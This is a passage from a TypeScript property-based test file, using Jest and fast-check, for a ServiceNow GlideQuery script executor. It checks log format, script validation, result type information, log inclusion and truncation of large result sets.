              expect(logMessage).toMatch(/\[\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z\]/);
              
              // Check for log level
              expect(logMessage).toMatch(/\[(INFO|WARN|ERROR)\]/);
              
              // Check for operation type
              expect(logMessage).toMatch(/\[(glidequery_execute|glidequery_test)\]/);
              
              // Check for execution details
              if (shouldSucceed && script.length > 0 && script.length <= 10000) {
                // Successful execution should have info or error logs
                if (logMessage.includes('[INFO]')) {
                  // Should contain execution details
                  expect(logMessage).toMatch(/Starting GlideQuery script execution|Script execution completed/);
                }
              } else {
                // Failed execution should have warn or error logs
                if (logMessage.includes('[WARN]') || logMessage.includes('[ERROR]')) {
                  // Should contain error information
                  expect(logMessage).toMatch(/failed|error|violation|empty|too long/i);
                }
              }
              
              // Check for duration/execution time
              if (logMessage.includes('duration=')) {
                const durationMatch = logMessage.match(/duration=(\d+)ms/);
                if (durationMatch) {
                  const duration = parseInt(durationMatch[1], 10);
                  expect(duration).toBeGreaterThanOrEqual(0);
                  // Duration should be reasonable (within test execution window)
                  expect(duration).toBeLessThan(afterExecution - beforeExecution + 1000);
                }
              }
            }

            // Verify execution result matches logging
            if (shouldSucceed && script.length > 0 && script.length <= 10000 && 
                !script.includes('gs.executeNow') && !script.includes('gs.eval') && 
                !script.includes('eval(') && !script.includes('Function(') && 
                !script.includes('GlideRecord')) {
              // Successful execution
              expect(result.success).toBe(true);
              
              // Should have info logs for start and completion
              const infoLogs = consoleLogSpy.mock.calls.filter(call => 
                call[0].includes('glidequery_execute') || call[0].includes('glidequery_test')
              );
              expect(infoLogs.length).toBeGreaterThanOrEqual(2); // Start + completion
            } else {
              // Failed execution
              expect(result.success).toBe(false);
              
              // Should have warn or error logs
              const errorLogs = [
                ...consoleWarnSpy.mock.calls,
                ...consoleErrorSpy.mock.calls
              ].filter(call => 
                call[0].includes('glidequery_execute') || call[0].includes('glidequery_test')
              );
              expect(errorLogs.length).toBeGreaterThan(0);
            }

            // Verify execution time is logged
            expect(result.executionTime).toBeGreaterThanOrEqual(0);
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });

    it('should log validation operations with timestamp and execution details', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate various validation scenarios
          fc.oneof(
            // Valid scripts
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              operation: fc.constantFrom('count', 'select', 'selectOne')
            }).map(({ table, operation }) => ({
              script: operation === 'count'
                ? `new GlideQuery('${table}').count()`
                : operation === 'selectOne'
                ? `new GlideQuery('${table}').where('active', true).selectOne()`
                : `new GlideQuery('${table}').where('active', true).select()`,
              shouldBeValid: true
            })),
            
            // Invalid scripts - empty
            fc.constant({
              script: '',
              shouldBeValid: false
            }),
            
            // Invalid scripts - undefined methods
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              badMethod: fc.constantFrom('selectAll', 'findOne', 'query', 'addQuery')
            }).map(({ table, badMethod }) => ({
              script: `new GlideQuery('${table}').${badMethod}()`,
              shouldBeValid: false
            })),
            
            // Invalid scripts - invalid operators
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              invalidOp: fc.constantFrom('INVALID_OP', 'BAD_OPERATOR', 'WRONG')
            }).map(({ table, invalidOp }) => ({
              script: `new GlideQuery('${table}').where('field', '${invalidOp}', 'value').select()`,
              shouldBeValid: false
            }))
          ),
          async ({ script, shouldBeValid }) => {
            // Clear console spies
            consoleLogSpy.mockClear();
            consoleWarnSpy.mockClear();

            // Record timestamp before validation
            const beforeValidation = Date.now();

            // Validate the script
            const result = executor.validate(script);

            // Record timestamp after validation
            const afterValidation = Date.now();

            // Property: Validation operations should be logged with timestamp and details
            
            // Verify that logging occurred
            const allLogs = [
              ...consoleLogSpy.mock.calls,
              ...consoleWarnSpy.mock.calls
            ];

            expect(allLogs.length).toBeGreaterThan(0);

            // Find log entries related to validation
            const validationLogs = allLogs.filter(call => {
              const logMessage = call[0];
              return typeof logMessage === 'string' && logMessage.includes('glidequery_validate');
            });

            expect(validationLogs.length).toBeGreaterThan(0);

            // Verify log entry structure
            for (const logCall of validationLogs) {
              const logMessage = logCall[0];
              
              // Check for timestamp
              expect(logMessage).toMatch(/\[\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z\]/);
              
              // Check for log level
              expect(logMessage).toMatch(/\[(INFO|WARN)\]/);
              
              // Check for operation type
              expect(logMessage).toMatch(/\[glidequery_validate\]/);
              
              // Check for validation message
              expect(logMessage).toMatch(/Starting GlideQuery script validation|Validation completed|Validation failed/);
              
              // Check for duration
              if (logMessage.includes('duration=')) {
                const durationMatch = logMessage.match(/duration=(\d+)ms/);
                if (durationMatch) {
                  const duration = parseInt(durationMatch[1], 10);
                  expect(duration).toBeGreaterThanOrEqual(0);
                  expect(duration).toBeLessThan(afterValidation - beforeValidation + 100);
                }
              }
            }

            // Verify validation result matches logging
            expect(result.valid).toBe(shouldBeValid);
            
            if (shouldBeValid) {
              // Valid scripts should have info logs
              const infoLogs = consoleLogSpy.mock.calls.filter(call => 
                call[0].includes('glidequery_validate')
              );
              expect(infoLogs.length).toBeGreaterThanOrEqual(2); // Start + completion
            } else {
              // Invalid scripts should have warn logs
              const warnLogs = consoleWarnSpy.mock.calls.filter(call => 
                call[0].includes('glidequery_validate')
              );
              expect(warnLogs.length).toBeGreaterThan(0);
            }
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });
  });

  // Feature: glidequery-development-tools, Property 22: Primitive value type information
  // **Validates: Requirements 8.2**
  describe('Property 22: Primitive value type information', () => {
    it('should include type information for any primitive value result', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate primitive values of different types
          fc.oneof(
            fc.integer(),
            fc.double(),
            fc.string(),
            fc.boolean()
          ),
          async (primitiveValue) => {
            // Mock script execution returning a primitive value
            const mockResponse: ScriptExecutionResult = {
              success: true,
              result: primitiveValue,
              executionTime: 50
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            const script = `new GlideQuery('incident').count()`;
            const result = await executor.execute(script);

            // Verify result includes type information
            expect(result.success).toBe(true);
            expect(result.data).toBeDefined();
            expect(result.data).toHaveProperty('value');
            expect(result.data).toHaveProperty('type');
            expect(result.data.value).toBe(primitiveValue);
            expect(result.data.type).toBe(typeof primitiveValue);
            expect(['number', 'string', 'boolean']).toContain(result.data.type);
          }
        ),
        { numRuns: 100 }
      );
    });
  });

  // Feature: glidequery-development-tools, Property 23: Log inclusion
  // **Validates: Requirements 8.4**
  describe('Property 23: Log inclusion', () => {
    it('should include logs in ExecutionResult for any script that produces logs', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate various log messages
          fc.array(fc.string({ minLength: 1, maxLength: 100 }), { minLength: 1, maxLength: 10 }),
          async (logMessages) => {
            // Mock script execution with logs
            const mockResponse: ScriptExecutionResult = {
              success: true,
              result: { data: 'test' },
              logs: logMessages,
              executionTime: 50
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            const script = `new GlideQuery('incident').select()`;
            const result = await executor.execute(script);

            // Verify logs are included in result
            expect(result.success).toBe(true);
            expect(result.logs).toBeDefined();
            expect(Array.isArray(result.logs)).toBe(true);
            
            // All original logs should be present
            for (const log of logMessages) {
              expect(result.logs).toContain(log);
            }
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should include logs for warnings and truncation messages', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate large arrays that will be truncated
          fc.integer({ min: 1001, max: 5000 }),
          async (arraySize) => {
            // Create array larger than MAX_RESULTS (1000)
            const largeArray = Array.from({ length: arraySize }, (_, i) => ({ id: i }));
            
            const mockResponse: ScriptExecutionResult = {
              success: true,
              result: largeArray,
              executionTime: 100
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            const script = `new GlideQuery('incident').select()`;
            const result = await executor.execute(script);

            // Verify truncation log is included
            expect(result.success).toBe(true);
            expect(result.logs).toBeDefined();
            expect(result.logs!.length).toBeGreaterThan(0);
            
            const truncationLog = result.logs!.find((log: string) => 
              log.includes('Results truncated') && log.includes('1000') && log.includes(arraySize.toString())
            );
            expect(truncationLog).toBeDefined();
          }
        ),
        { numRuns: 100 }
      );
    });
  });

  // Feature: glidequery-development-tools, Property 24: Large result truncation
  // **Validates: Requirements 8.5**
  describe('Property 24: Large result truncation', () => {
    it('should truncate results and set truncated flag for any query returning more than maximum records', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate array sizes larger than MAX_RESULTS (1000)
          fc.integer({ min: 1001, max: 10000 }),
          async (recordCount) => {
            // Create array larger than MAX_RESULTS
            const largeResultSet = Array.from({ length: recordCount }, (_, i) => ({
              sys_id: `id_${i}`,
              number: `INC${String(i).padStart(7, '0')}`,
              active: true
            }));

            const mockResponse: ScriptExecutionResult = {
              success: true,
              result: largeResultSet,
              executionTime: 200
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            const script = `new GlideQuery('incident').select()`;
            const result = await executor.execute(script);

            // Verify truncation occurred
            expect(result.success).toBe(true);
            expect(result.truncated).toBe(true);
            expect(result.data).toBeDefined();
            expect(Array.isArray(result.data)).toBe(true);
            expect(result.data.length).toBe(1000); // MAX_RESULTS
            expect(result.recordCount).toBe(1000);
            
            // Verify truncation message in logs
            expect(result.logs).toBeDefined();
            const truncationLog = result.logs!.find((log: string) => 
              log.includes('Results truncated') && 
              log.includes('1000') && 
              log.includes(recordCount.toString())
            );
            expect(truncationLog).toBeDefined();
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should not truncate results below maximum and truncated flag should be false', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate array sizes smaller than or equal to MAX_RESULTS (1000)
          fc.integer({ min: 0, max: 1000 }),
          async (recordCount) => {
            const resultSet = Array.from({ length: recordCount }, (_, i) => ({
              sys_id: `id_${i}`,
              number: `INC${String(i).padStart(7, '0')}`
            }));

            const mockResponse: ScriptExecutionResult = {
              success: true,
              result: resultSet,
              executionTime: 100
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            const script = `new GlideQuery('incident').select()`;
            const result = await executor.execute(script);

            // Verify no truncation
            expect(result.success).toBe(true);
            expect(result.truncated).toBe(false);
            expect(result.data).toBeDefined();
            expect(Array.isArray(result.data)).toBe(true);
            expect(result.data.length).toBe(recordCount);
            expect(result.recordCount).toBe(recordCount);
            
            // Verify no truncation message in logs
            if (result.logs) {
              const truncationLog = result.logs.find((log: string) => log.includes('Results truncated'));
              expect(truncationLog).toBeUndefined();
            }
          }
        ),
        { numRuns: 100 }
      );
    });
  });
});
